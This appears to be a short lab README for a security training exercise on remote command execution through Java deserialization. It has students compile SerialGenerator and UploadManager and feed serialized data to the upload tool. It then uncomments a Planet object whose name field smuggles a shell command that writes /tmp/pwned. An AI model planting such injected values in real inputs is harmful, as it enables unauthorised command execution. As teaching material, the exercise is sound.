# Lab 5. Remote command execution

Compile the code:
```
javac SerialGenerator.java
javac UploadManager.java
```

Generate some serialized data:
```
java SerialGenerator
```

In a separate window, start monitoring the application log:
```
tail -f /var/log/planets/app.log
```

Feed the data to UploadManager:
```
echo <data> | java UploadManager
```

Uncomment the following from SerialGenerator:
```
serializeAnything("Pluto",
                  new Planet(9, "; echo I am a planet! > /tmp/pwned; cat /dev/null",
                             "Muhaha!", 1337));
```

Recompile and try again. Notice the applicaiton log and check /tmp/pwned
